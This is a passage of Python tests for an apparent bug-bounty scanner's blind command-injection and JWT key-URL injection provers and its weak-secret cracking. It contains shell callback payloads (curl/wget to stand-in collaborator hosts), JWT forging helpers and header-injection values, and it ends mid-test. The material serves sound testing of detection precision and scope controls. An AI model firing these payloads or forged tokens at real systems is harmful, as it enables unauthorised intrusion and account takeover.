"""Unauthenticated ATO + RCE hunting: the two new out-of-band provers and the recall fixes.

Everything here is about what the engine can prove against a target WITHOUT an operator session,
which is the position a bug-bounty hunt actually starts from:

  * ``oob_service.confirm_blind_rce`` — blind OS command injection. The in-pass prover can only
    confirm command injection the target hands back (an echoed arithmetic substitution, or a response
    it delays); a command that runs in a worker or a log pipeline returns a fast, identical 200 and was
    invisible. The interesting tests here are the PRECISION ones: a hit alone must not be called RCE,
    because an application that fetches any URL it finds in a parameter would also call home. The
    matched bare-URL control is what separates the two, and ``test_bare_control_also_hit_*`` is the
    test that fails if that discipline is ever dropped.

  * ``oob_service.confirm_jwt_key_injection`` — JWT ``jku``/``x5u`` signing-key URL injection, an
    unauthenticated account-takeover primitive. A verifier that resolves a key source named by the
    token it is verifying will accept tokens signed by the attacker. It is invisible in-band (fetch
    then reject looks exactly like never fetching), so the out-of-band fetch is the only observable.

  * ``_check_jwt_weak_secret`` reached the offline HMAC crack only through an operator credential, so
    the check could never fire in an unauthenticated hunt — the exact hunt where an app handing an
    anonymous visitor an HS256 guest token signed with "secret" is worth catching.

  * The per-pass request budget, which is what actually stopped the only CRITICAL check in the suite
    being starved by whatever happened to run before it. Two cleverer fixes were tried first and
    both made things worse, so there are regression tests here for each: reordering the check just
    starves XSS instead, and registering it twice makes one endpoint report the same class twice.

Offline and deterministic: no network. The collaborator poll is stubbed to the shapes a real one
produces, and the target side is a fake HTTP client that records what was sent.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import sys
import time
import unittest
from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parent
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from bughunter import active_verify_service as av  # noqa: E402
from bughunter import oob_service as oob  # noqa: E402
from bughunter import report as report_lib  # noqa: E402
from bughunter import taxonomy  # noqa: E402
from bughunter.settings import get_settings  # noqa: E402
from bughunter.web_ingest import MAX_URL_LENGTH  # noqa: E402

BASE = "https://collab.example"
SECRET = "s" * 16


def _b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _hs_token(secret: str, alg: str = "HS256", payload: dict | None = None) -> str:
    """An HS-signed JWT that really verifies under ``secret`` — what a target would hand out."""
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
    head = _b64(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
    body = _b64(json.dumps(payload or {"sub": "guest"}, separators=(",", ":")).encode())
    sig = _b64(hmac.new(secret.encode(), f"{head}.{body}".encode("ascii"), digest).digest())
    return f"{head}.{body}.{sig}"


class _FakeHttp:
    """Records every request the prover sends; answers with a fixed benign response."""

    def __init__(self, body: str = "", status: int = 200) -> None:
        self.fetched: list[str] = []
        self.headers_sent: list[dict] = []
        self.body = body
        self.status = status
        self.sent = 0
        self.auth = None  # the real _Http carries the operator session here; unauth by default

    def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
        self.fetched.append(url)
        self.headers_sent.append(dict(extra_headers or {}))
        self.sent += 1
        return {"status": self.status, "headers": {}, "body": self.body, "cookies": [],
                "final_url": url, "location": None, "elapsed": 0.01}


class _Collaborator:
    """A stubbed collaborator whose tokens are minted in a known order.

    ``hit_for`` names the mint indices that record an inbound interaction. Index 0 is the first token
    minted, which is always the matched bare-URL CONTROL, and index 1 is the shell-wrapped probe — so
    a test can say 'only the probe called home' (a real RCE) or 'both did' (a URL fetcher) exactly.
    Every token answers empty on its FIRST poll, which is the pre-probe negative control the prover
    requires before it will attribute anything.
    """

    def __init__(self, hit_for: set[int], ua: str = "curl/8.4.0") -> None:
        self.hit_for = hit_for
        self.ua = ua
        self.order: list[str] = []
        self.polls: dict[str, int] = {}
        self._real_mint = oob.mint_token

    def mint(self) -> str:
        token = self._real_mint()
        self.order.append(token)
        return token

    def poll(self, base, secret, token, **kwargs):
        seen = self.polls.get(token, 0)
        self.polls[token] = seen + 1
        index = self.order.index(token) if token in self.order else -1
        if seen == 0:
            return {"ok": True, "count": 0, "hits": []}  # pre-probe negative control
        if index in self.hit_for:
            return {"ok": True, "count": 1,
                    "hits": [{"method": "GET", "path": f"/oob/{token}", "ip": "203.0.113.9",
                              "headers": {"user-agent": self.ua}}]}
        return {"ok": True, "count": 0, "hits": []}

    def install(self, case: unittest.TestCase) -> "_Collaborator":
        case.addCleanup(setattr, oob, "mint_token", oob.mint_token)
        case.addCleanup(setattr, oob, "poll_collaborator", oob.poll_collaborator)
        case.addCleanup(setattr, oob, "_guard_url", oob._guard_url)
        oob.mint_token = self.mint
        oob.poll_collaborator = self.poll
        # Bypass the DNS/SSRF guard the way the existing OOB tests do: example.com hosts do not
        # resolve, and the guard is not what these tests are about. Scope binding is checked BEFORE
        # the guard, so the fail-closed scope tests below still exercise the real gate.
        oob._guard_url = lambda u, *a, **k: u
        return self


class BlindRcePayloadTests(unittest.TestCase):
    """The payload itself: real shell contexts, and short enough to actually be sent."""

    def test_every_variant_carries_the_callback_in_a_shell_context(self) -> None:
        payloads = oob.build_rce_payloads(BASE, "tok123")
        self.assertEqual(set(payloads), {"separator", "substitution", "backtick", "pipe", "newline"})
        for name, value in payloads.items():
            self.assertIn(f"{BASE}/oob/tok123", value, f"{name} must carry the callback")
            # Manual-delivery variants keep BOTH fetch binaries: the operator pastes one variant, so it
            # should work on an image that ships only wget.
            self.assertIn("curl", value)
            self.assertIn("wget", value)
        self.assertTrue(payloads["separator"].startswith(";"))
        self.assertTrue(payloads["substitution"].startswith("$("))
        self.assertTrue(payloads["backtick"].startswith("`"))
        self.assertTrue(payloads["pipe"].startswith("|"))
        self.assertTrue(payloads["newline"].startswith("\n"))

    def test_combined_probe_url_fits_the_url_guard_with_a_long_collaborator(self) -> None:
        # web_ingest rejects a URL over MAX_URL_LENGTH by raising inside _Http.fetch, which the sweep
        # catches and treats as "skip this parameter" -- so an over-long payload disables the whole
        # probe SILENTLY. The collaborator base is operator-supplied and can be a long tunnel hostname.
        long_base = "https://a-very-long-tunnel-subdomain-name-goes-right-here.trycloudflare.com"
        value = oob._rce_probe_value(long_base, "f" * 32)
        url = av._with_query("https://target.example/api/v2/diagnostics/ping?x=1", {"host": value})
        self.assertLess(len(url), MAX_URL_LENGTH)
        self.assertIn(f"{long_base}/oob/", value)

    def test_probe_value_always_carries_at_least_one_context(self) -> None:
        # Budget smaller than a single context: truncating to nothing would quietly disable the sweep.
        value = oob._rce_probe_value(BASE, "t", max_len=1)
        self.assertTrue(value)
        self.assertIn(f"{BASE}/oob/t", value)


class BlindRceConfirmTests(unittest.TestCase):
    """Parameter-borne blind command injection: what confirms, and what must NOT."""

    def _run(self, collab: _Collaborator, url: str = "https://app.example.com/?cmd=x", **kw):
        http = _FakeHttp()
        res = oob.confirm_blind_rce(url, base=BASE, secret=SECRET, scope="app.example.com",
                                    settings=get_settings(), http=http, poll_attempts=2,
                                    poll_delay_s=0.0, **kw)
        return res, http

    def test_probe_hit_with_silent_bare_control_confirms_rce(self) -> None:
        collab = _Collaborator(hit_for={1}).install(self)  # index 1 == the shell-wrapped probe
        res, http = self._run(collab)
        self.assertEqual(res["status"], "confirmed")
        self.assertEqual(res["param"], "cmd")
        finding = res["finding"]
        self.assertEqual(finding["_active_class_hint"], "rce")
        self.assertEqual(finding["cwe"], "CWE-78")
        self.assertEqual(finding["severity"], "critical")
        # The control was sent BEFORE the probe, so a hit can never be an artefact of the control
        # simply having had less time to land.
        # Three target requests: the bare control, the shell-wrapped probe, and -- only because the
        # probe called home -- a SECOND bare control, re-sent to re-test the URL-fetcher hypothesis
        # under the same conditions the probe met.
        self.assertEqual(len(http.fetched), 3)
        self.assertNotIn("$(", http.fetched[0])
        self.assertIn("%24%28", http.fetched[1])  # $( url-encoded -> the shell-wrapped probe
        self.assertNotIn("$(", http.fetched[2])

    def test_bare_control_also_hit_is_reported_as_url_fetch_not_rce(self) -> None:
        # THE precision guarantee. An unfurler / webhook validator / plain SSRF fetches any URL it
        # finds in the parameter, so it calls home for the shell-wrapped value too. Calling that a
        # CRITICAL RCE would be a fabricated severity -- the bare control is what rules it out.
        collab = _Collaborator(hit_for={0, 1}).install(self)
        res, _ = self._run(collab)
        self.assertEqual(res["status"], "url-fetch")
        self.assertNotIn("finding", res)
        self.assertIn("blind SSRF", res["reason"])

    def test_no_callback_hands_back_a_manual_kit(self) -> None:
        collab = _Collaborator(hit_for=set()).install(self)
        res, _ = self._run(collab)
        self.assertEqual(res["status"], "no-callback")
        self.assertNotIn("finding", res)
        self.assertTrue(res["token"])
        self.assertEqual(set(res["payloads"]), {"separator", "substitution", "backtick", "pipe", "newline"})

    def test_crawler_user_agent_downgrades_to_candidate(self) -> None:
        collab = _Collaborator(hit_for={1}, ua="Mozilla/5.0 (compatible; Googlebot/2.1)").install(self)
        res, _ = self._run(collab)
        self.assertEqual(res["status"], "candidate")
        self.assertEqual(res["finding"]["_active_proof"]["status"], "candidate")

    def test_token_with_pre_existing_hits_is_never_attributed(self) -> None:
        # A token that already carries interactions (collision, or a shared collaborator) cannot
        # attribute a later hit to our probe, so the parameter must be skipped, not confirmed.
        collab = _Collaborator(hit_for={0, 1}).install(self)
        collab.poll = lambda b, s, t, **k: {"ok": True, "count": 3, "hits": [{"method": "GET"}]}
        oob.poll_collaborator = collab.poll
        http = _FakeHttp()
        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=http,
                                    poll_attempts=1, poll_delay_s=0.0)
        # "no-callback" would read as "tested, clean". Nothing was sent, so the class was NOT tested.
        self.assertEqual(res["status"], "not-probed")
        self.assertFalse(res["ok"])
        self.assertEqual(http.fetched, [], "nothing may be sent for an unattributable token")

    def test_out_of_scope_target_is_fail_closed(self) -> None:
        _Collaborator(hit_for={1}).install(self)
        res = oob.confirm_blind_rce("https://not-mine.example/?cmd=x", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
                                    poll_attempts=1, poll_delay_s=0.0)
        self.assertFalse(res["ok"])
        self.assertIn("not named in your scope", res["error"])

    def test_missing_collaborator_config_is_refused(self) -> None:
        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base="", secret="",
                                    scope="app.example.com", settings=get_settings())
        self.assertFalse(res["ok"])

    def test_confirmed_finding_satisfies_the_report_evidence_gate(self) -> None:
        # report._has_captured_artifact is the single authority that lets anything render 'confirmed'.
        # A blind finding whose proof is an out-of-band callback must pass it on the differential pair,
        # or the engine would prove an RCE and then report it as a candidate.
        collab = _Collaborator(hit_for={1}).install(self)
        res, _ = self._run(collab)
        finding = res["finding"]
        proof = finding["_active_proof"]
        self.assertTrue(report_lib._has_captured_artifact(finding, proof))
        self.assertTrue(proof["observed_result"].strip())
        self.assertTrue(proof["control_result"].strip())
        self.assertNotEqual(proof["observed_result"], proof["control_result"])


class BlindRceHeaderTests(unittest.TestCase):
    """Headers are the injection point that needs no parameter to exist on an unauth request."""

    def test_header_phase_names_the_exact_header_that_called_home(self) -> None:
        # Param phase finds nothing (a param-less URL still probes the default names), then the header
        # phase mints one control + one token per header. Order: ...controls..., then per-header tokens.
        collab = _Collaborator(hit_for=set()).install(self)
        http = _FakeHttp()
        res = oob.confirm_blind_rce("https://app.example.com/", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=http,
                                    poll_attempts=1, poll_delay_s=0.0)
        self.assertEqual(res["status"], "no-callback")
        self.assertEqual(res["headers_tried"], list(oob._RCE_OOB_HEADERS))
        # The probe request carried a shell-wrapped payload in each header, not a bare URL.
        probe_headers = [h for h in http.headers_sent if h and any("$(" in v for v in h.values())]
        self.assertTrue(probe_headers)
        self.assertEqual(set(probe_headers[0]), set(oob._RCE_OOB_HEADERS))

    def test_header_payload_is_accepted_by_the_real_http_header_validator(self) -> None:
        # Regression: the combined payload carries a newline context, which a query parameter encodes
        # to %0A quite happily but an HTTP header CANNOT hold — http.client refuses CR/LF in a header
        # value outright (that is request splitting). The first header send therefore raised every
        # time, and ValueError is not one of the prover's own errors, so the whole header phase was
        # dead on arrival. Exercised against the REAL validator, because a fake client would not
        # have caught this.
        import http.client
        value = oob._rce_probe_value(BASE, "t" * 32, header_safe=True)
        self.assertNotIn(chr(10), value)   # LF
        self.assertNotIn(chr(13), value)   # CR
        conn = http.client.HTTPConnection("127.0.0.1", 1, timeout=0.1)
        conn.putrequest("GET", "/")
        for header in oob._RCE_OOB_HEADERS:
            conn.putheader(header, value)  # raises ValueError if the payload is not header-safe

    def test_header_safe_payload_keeps_the_other_shell_contexts(self) -> None:
        value = oob._rce_probe_value(BASE, "tok", header_safe=True)
        for fragment in (";curl", "$(", "`", "|"):
            self.assertIn(fragment, value)
        # The parameter payload is unrestricted and keeps the newline context.
        self.assertIn(chr(10), oob._rce_probe_value(BASE, "tok"))

    def test_headers_can_be_skipped(self) -> None:
        collab = _Collaborator(hit_for=set()).install(self)
        http = _FakeHttp()
        res = oob.confirm_blind_rce("https://app.example.com/", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=http,
                                    probe_headers=False, poll_attempts=1, poll_delay_s=0.0)
        self.assertEqual(res["headers_tried"], [])


class BlindRceAdjudicationTests(unittest.TestCase):
    """What the prover does with the evidence once a callback lands."""

    def test_a_late_bare_control_still_defeats_the_rce_claim(self) -> None:
        # THE defect adversarial review found. The probe used to get four polls over eight seconds
        # while its control got one read with no delay, so an async URL-fetcher whose bare fetch
        # landed a moment later was reported as a confirmed CVSS 9.8. The control now gets the
        # probe's full budget, so "late" is still "answered".
        class _LateControl(_Collaborator):
            def poll(self, base, secret, token, **kwargs):
                seen = self.polls.get(token, 0)
                self.polls[token] = seen + 1
                index = self.order.index(token) if token in self.order else -1
                if seen == 0:
                    return {"ok": True, "count": 0, "hits": []}
                # The probe (index 1) answers immediately; the control (index 0) only on its THIRD
                # read — inside the probe's window, outside a single zero-delay read.
                if index == 1 or (index == 0 and seen >= 2):
                    return {"ok": True, "count": 1,
                            "hits": [{"method": "GET", "path": "/oob/" + token, "ip": "203.0.113.9",
                                      "headers": {"user-agent": "curl/8.4.0"}}]}
                return {"ok": True, "count": 0, "hits": []}

        _LateControl(hit_for={1}).install(self)
        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
                                    poll_attempts=4, poll_delay_s=0.0)
        self.assertEqual(res["status"], "url-fetch")
        self.assertNotIn("finding", res)

    def test_a_silent_first_control_is_re_tested_before_confirming(self) -> None:
        # The re-send also covers an app that only services the SECOND request from a new IP: the
        # original control was request one, so a fresh one is sent and polled before confirming.
        collab = _Collaborator(hit_for={1}).install(self)
        http = _FakeHttp()
        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=http,
                                    poll_attempts=2, poll_delay_s=0.0)
        self.assertEqual(res["status"], "confirmed")
        self.assertEqual(len(collab.order), 3, "control, probe, then a re-sent control")

    def test_an_unestablishable_control_is_reported_as_unproven_not_as_a_fetch(self) -> None:
        """Failing closed is right; describing it as something else is not.

        When the second control cannot be minted the prover refuses to claim execution -- correct,
        since the whole severity rests on the bare URL having stayed silent. But it must not then say
        "the target fetched the bare URL", which is a different claim and an unsupported one.
        """
        class _NoFreshTokens(_Collaborator):
            def poll(self, base, secret, token, **kwargs):
                seen = self.polls.get(token, 0)
                self.polls[token] = seen + 1
                index = self.order.index(token) if token in self.order else -1
                if index >= 2:
                    # Every token minted AFTER the first control+probe pair looks already-used, so no
                    # re-control can ever be attributed.
                    return {"ok": True, "count": 7, "hits": [{"method": "GET"}]}
                if seen == 0:
                    return {"ok": True, "count": 0, "hits": []}
                if index == 1:
                    return {"ok": True, "count": 1,
                            "hits": [{"method": "GET", "path": "/oob/" + token, "ip": "203.0.113.9",
                                      "headers": {"user-agent": "curl/8.4.0"}}]}
                return {"ok": True, "count": 0, "hits": []}

        _NoFreshTokens(hit_for={1}).install(self)
        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
                                    poll_attempts=2, poll_delay_s=0.0)
        self.assertEqual(res["status"], "url-fetch")
        self.assertEqual(res["control"], "unverifiable")
        self.assertNotIn("finding", res)
        self.assertIn("could not be established", res["reason"])
        self.assertNotIn("the target fetched the BARE callback URL", res["reason"])

    def test_an_application_client_user_agent_downgrades_the_claim(self) -> None:
        # The payload only ever runs curl/wget. A callback from an application HTTP stack is evidence
        # against "a shell fetched this", and it is evidence already in hand.
        _Collaborator(hit_for={1}, ua="python-requests/2.31.0").install(self)
        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
                                    poll_attempts=2, poll_delay_s=0.0)
        self.assertEqual(res["status"], "candidate")

    def test_the_ua_gate_only_fires_on_positive_contrary_evidence(self) -> None:
        for ua in ("curl/8.4.0", "Wget/1.21.4", "", "   ", "some-unknown-agent"):
            self.assertFalse(oob._ua_contradicts_shell(ua), ua)
        for ua in ("python-requests/2.31.0", "Go-http-client/1.1", "okhttp/4.12", "Java/17.0.1",
                   "axios/1.6", "node-fetch/3", "Googlebot/2.1"):
            self.assertTrue(oob._ua_contradicts_shell(ua), ua)

    def test_a_hit_with_a_non_dict_headers_field_does_not_crash(self) -> None:
        # poll_collaborator normalises the body's shape but never the NESTED headers, and every
        # confirm site reads (hit["headers"]).get("user-agent"). A tainted tunnel could serve a string.
        raw = {"ok": True, "count": 1, "hits": [{"method": "GET", "headers": "not-a-dict"}]}
        calls: dict = {}

        def poll(base, secret, token, **kwargs):
            calls[token] = calls.get(token, 0) + 1
            return {"ok": True, "count": 0, "hits": []} if calls[token] == 1 else dict(raw)

        self.addCleanup(setattr, oob, "poll_collaborator", oob.poll_collaborator)
        self.addCleanup(setattr, oob, "_guard_url", oob._guard_url)
        oob.poll_collaborator = poll
        oob._guard_url = lambda u, *a, **k: u
        res = oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                                    scope="app.example.com", settings=get_settings(), http=_FakeHttp(),
                                    poll_attempts=1, poll_delay_s=0.0)
        self.assertIn(res.get("status"), {"url-fetch", "confirmed", "candidate", "no-callback"})

    def test_the_program_user_agent_survives_the_header_probe(self) -> None:
        # A program can REQUIRE its researcher marker on every request. _Http.fetch applies
        # extra_headers after its own UA, so a payload placed there replaced the marker outright.
        from bughunter.web_scan_service import _USER_AGENT, current_user_agent
        value = oob._header_value("User-Agent", ";curl -s https://c.ex/oob/t")
        self.assertTrue(value.startswith(current_user_agent(_USER_AGENT)))
        self.assertIn(";curl -s", value)
        # Headers that carry no identity take the payload alone.
        self.assertEqual(oob._header_value("Referer", ";curl -s x"), ";curl -s x")


class JwtKeyUrlInjectionTests(unittest.TestCase):
    """jku / x5u — telling the verifier where to fetch the key it trusts."""

    def test_forge_repoints_the_key_url_and_keeps_payload_and_signature(self) -> None:
        token = _hs_token("secret")
        forged = oob.forge_jwt_key_url(token, "jku", f"{BASE}/oob/t1")
        self.assertTrue(forged)
        head = json.loads(base64.urlsafe_b64decode(forged.split(".")[0] + "=="))
        self.assertEqual(head["jku"], f"{BASE}/oob/t1")
        self.assertEqual(head["alg"], "HS256")  # untouched -- we are not forging a signature here
        self.assertEqual(forged.split(".")[1:], token.split(".")[1:])

    def test_malformed_tokens_are_a_clean_skip(self) -> None:
        for bad in ("", "not-a-jwt", "a.b", "...", "@@@.###.$$$"):
            self.assertEqual(oob.forge_jwt_key_url(bad, "jku", "u"), "", f"{bad!r} must not raise")

    def test_server_fetching_the_named_key_url_confirms(self) -> None:
        collab = _Collaborator(hit_for={0}).install(self)  # first minted token == the jku probe
        http = _FakeHttp(body=f'{{"token":"{_hs_token("secret")}"}}')
        res = oob.confirm_jwt_key_injection("https://app.example.com/api/me", base=BASE, secret=SECRET,
                                            scope="app.example.com", settings=get_settings(), http=http,
                                            poll_attempts=2, poll_delay_s=0.0)
        self.assertEqual(res["status"], "confirmed")
        self.assertEqual(res["field"], "jku")
        finding = res["finding"]
        self.assertEqual(finding["_active_class_hint"], "jwt")
        self.assertEqual(finding["cwe"], "CWE-347")
        self.assertTrue(report_lib._has_captured_artifact(finding, finding["_active_proof"]))
        # The forged token rode in an Authorization header, and the request is otherwise the same GET.
        auth_values = [h.get("Authorization", "") for h in http.headers_sent if h]
        self.assertTrue(any(v.startswith("Bearer ") for v in auth_values))

    def test_scores_only_the_proven_fetch_not_full_takeover(self) -> None:
        # The probe proves the verifier RESOLVED an attacker-named key source. It does not prove the
        # server would accept a key served from there, so it must not be priced as 9.8 token forgery.
        collab = _Collaborator(hit_for={0}).install(self)
        http = _FakeHttp(body=f'{{"token":"{_hs_token("secret")}"}}')
        res = oob.confirm_jwt_key_injection("https://app.example.com/api/me", base=BASE, secret=SECRET,
                                            scope="app.example.com", settings=get_settings(), http=http,
                                            poll_attempts=2, poll_delay_s=0.0)
        cvss = res["attack_plan"]["cvss"]
        self.assertEqual(cvss["base_severity"], "high")
        self.assertEqual(cvss["base_score"], 7.5)
        self.assertIn("I:N", cvss["vector"])
        self.assertIn("demonstrate that step", cvss["justification"])
        self.assertIn("does NOT prove", res["finding"]["_active_proof"]["limitations"])

    def test_target_issuing_no_token_is_a_clean_no_op(self) -> None:
        collab = _Collaborator(hit_for={0}).install(self)
        http = _FakeHttp(body="<html>nothing here</html>")
        res = oob.confirm_jwt_key_injection("https://app.example.com/", base=BASE, secret=SECRET,
                                            scope="app.example.com", settings=get_settings(), http=http,
                                            poll_attempts=1, poll_delay_s=0.0)
        self.assertEqual(res["status"], "no-token")
        self.assertEqual(http.fetched, ["https://app.example.com/"], "only the landing read")

    def test_out_of_scope_target_is_fail_closed(self) -> None:
        _Collaborator(hit_for={0}).install(self)
        res = oob.confirm_jwt_key_injection("https://not-mine.example/", base=BASE, secret=SECRET,
                                            scope="app.example.com", settings=get_settings(),
                                            http=_FakeHttp())
        self.assertFalse(res["ok"])
        self.assertIn("not named in your scope", res["error"])


class JwtWeakSecretUnauthTests(unittest.TestCase):
    """The offline HMAC crack must reach a token the TARGET issued, not only an operator credential."""

    def test_weak_secret_is_cracked_from_a_token_the_app_handed_an_anonymous_visitor(self) -> None:
        token = _hs_token("secret")
        http = _FakeHttp(body="authenticated dashboard for guest user")
        found = av._check_jwt_weak_secret(http, "https://app.example.com/", discovered_token=token)
        self.assertIsNotNone(found, "an app-issued HS256 token signed with a weak secret must be caught")
        self.assertEqual(found["_active_class_hint"], "jwt")
        self.assertEqual(found["severity"], "critical")
        self.assertIn("secret", found["_active_proof"]["observed_result"])

    def test_no_token_anywhere_is_still_a_no_op(self) -> None:
        http = _FakeHttp()
        self.assertIsNone(av._check_jwt_weak_secret(http, "https://app.example.com/"))
        self.assertEqual(http.fetched, [], "a check with nothing to crack must not spend a request")

    def test_strong_secret_is_not_claimed(self) -> None:
        http = _FakeHttp()
        token = _hs_token("O8xj2!kQ_zv93Lm4ncYw0rTh1sIsNotWeak")
        self.assertIsNone(av._check_jwt_weak_secret(http, "https://app.example.com/", discovered_token=token))

    def test_corroboration_does_not_claim_acceptance_on_a_differing_body(self) -> None:
        # On the discovered-token path the baseline is NOT automatically authenticated, so a public
        # page answering 200 for any Authorization header would otherwise be narrated as the server
        # accepting a forged token. Bodies that differ must leave the offline-only wording in place.
        class _Varying(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                which = "real account page with private data" if self.sent == 1 else "generic login page"
                return {"status": 200, "headers": {}, "body": which, "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}

        found = av._check_jwt_weak_secret(_Varying(), "https://app.example.com/",
                                          discovered_token=_hs_token("secret"))
        self.assertIsNotNone(found)
        self.assertIn("not sent to the server", found["_active_proof"]["control_result"])

    def test_corroboration_is_silent_against_a_server_that_ignores_the_token(self) -> None:
        # THE false-corroboration case. A wholly public endpoint answers 200 with the same body for
        # every request, so a body-match gate alone reported "was accepted ... body match 100%" about
        # a server that never looked at either token. The finding itself stays confirmed either way --
        # the offline crack self-certifies -- but the narrative must not claim a server-side accept
        # that did not happen.
        http = _FakeHttp(body="our public marketing homepage, identical for everyone")
        found = av._check_jwt_weak_secret(http, "https://app.example.com/",
                                          discovered_token=_hs_token("secret"))
        self.assertIsNotNone(found)
        control = found["_active_proof"]["control_result"]
        self.assertNotIn("was accepted", control)
        self.assertIn("not sent to the server", control)

    def test_corroboration_reports_acceptance_only_when_the_server_actually_verifies(self) -> None:
        # A server that REJECTS a corrupted signature is verifying; if it then accepts our forged
        # token and returns the authenticated body, "was accepted" is earned.
        real = _hs_token("secret")
        page = "the authenticated account page for user 42"

        class _Verifying(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                token = (extra_headers or {}).get("Authorization", "").replace("Bearer ", "")
                head, _, rest = token.partition(".")
                payload, _, sig = rest.partition(".")
                # Anything HMAC-signed under the weak secret verifies; the corrupted copy does not.
                good = (not token) or token == real or sig == _hs_token(
                    "secret", payload=json.loads(base64.urlsafe_b64decode(payload + "==")) if payload else {}
                ).split(".")[2]
                return {"status": 200 if good else 401, "headers": {},
                        "body": page if good else "unauthorized", "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}

        found = av._check_jwt_weak_secret(_Verifying(), "https://app.example.com/", discovered_token=real)
        self.assertIsNotNone(found)
        control = found["_active_proof"]["control_result"]
        self.assertIn("was accepted", control)
        self.assertIn("corrupted-signature copy was rejected", control)


class WeakSecretOwnershipTests(unittest.TestCase):
    """Cracking a string proves how it was signed, not that this application trusts it."""

    # jwt.io's own example token is signed with this, and it is in the engine's weak-secret list — so
    # a docs page that shows an example token is the exact false-positive shape to defend against.
    DOC_SECRET = "your-256-bit-secret"

    def test_a_token_scraped_from_the_page_is_only_a_candidate(self) -> None:
        http = _FakeHttp(body="our public API docs, showing an example token")
        found = av._check_jwt_weak_secret(http, "https://app.example.com/docs",
                                          discovered_token=_hs_token(self.DOC_SECRET))
        self.assertIsNotNone(found)
        self.assertEqual(found["_active_proof"]["status"], "candidate")
        self.assertIn("acceptance not shown", found["title"])
        self.assertIn("TRUSTS this token is not", found["_active_proof"]["limitations"])

    def test_a_scraped_token_the_server_honours_is_confirmed(self) -> None:
        real = _hs_token("secret")
        page = "the authenticated account page for user 42"

        class _Verifying(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                token = (extra_headers or {}).get("Authorization", "").replace("Bearer ", "")
                head, _, rest = token.partition(".")
                payload, _, sig = rest.partition(".")
                good = (not token) or token == real or sig == _hs_token(
                    "secret", payload=json.loads(base64.urlsafe_b64decode(payload + "==")) if payload else {}
                ).split(".")[2]
                return {"status": 200 if good else 401, "headers": {},
                        "body": page if good else "unauthorized", "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}

        found = av._check_jwt_weak_secret(_Verifying(), "https://app.example.com/", discovered_token=real)
        self.assertEqual(found["_active_proof"]["status"], "confirmed")
        self.assertEqual(found["_active_proof"]["limitations"], "")

    def test_an_operator_credential_stays_confirmed_on_the_crypto_alone(self) -> None:
        # The operator's own session token IS a live credential, so the byte-equality is the proof;
        # a network failure on the corroboration must not demote it.
        from bughunter.scan_auth import build_auth

        class _Dead(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                raise av._ActiveError("connection reset")

        http = _Dead()
        http.auth = build_auth("https://app.example.com/",
                               headers=["Authorization: Bearer " + _hs_token("secret")])
        found = av._check_jwt_weak_secret(http, "https://app.example.com/")
        self.assertIsNotNone(found)
        self.assertEqual(found["_active_proof"]["status"], "confirmed")


class ServedTokenTransportTests(unittest.TestCase):
    """A token is replayed on the transport it arrived on, or the verifier never sees it."""

    def test_a_cookie_token_rebuilds_the_whole_cookie_header(self) -> None:
        token = _hs_token("secret")
        landing = {"cookies": ["csrf=abc123; Path=/", "session=" + token + "; HttpOnly", "theme=dark"],
                   "body": "", "headers": {}}
        name, found, rebuild = oob._served_token_carrier(landing)
        self.assertEqual(name, "Cookie")
        self.assertEqual(found, token)
        # Every crumb survives; only the JWT one is swapped.
        self.assertEqual(rebuild("FORGED"), "csrf=abc123; session=FORGED; theme=dark")

    def test_a_body_token_is_replayed_as_a_bearer(self) -> None:
        token = _hs_token("secret")
        name, found, rebuild = oob._served_token_carrier(
            {"cookies": [], "body": json.dumps({"access_token": token}), "headers": {}})
        self.assertEqual(name, "Authorization")
        self.assertEqual(rebuild("FORGED"), "Bearer FORGED")

    def test_no_token_yields_no_carrier(self) -> None:
        self.assertIsNone(oob._served_token_carrier({"cookies": [], "body": "nothing", "headers": {}}))
        self.assertIsNone(oob._served_token_carrier(None))

    def test_the_key_probe_sends_a_cookie_token_back_as_a_cookie(self) -> None:
        # Regression: a cookie-session app never saw the forged token, so the probe could not provoke
        # the fetch it exists to observe and reported a clean "no callback" on a vulnerable target.
        token = _hs_token("secret")
        _Collaborator(hit_for=set()).install(self)

        class _CookieSession(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                return {"status": 200, "headers": {}, "body": "", "final_url": url, "location": None,
                        "elapsed": 0.01, "cookies": ["session=" + token + "; HttpOnly"]}

        http = _CookieSession()
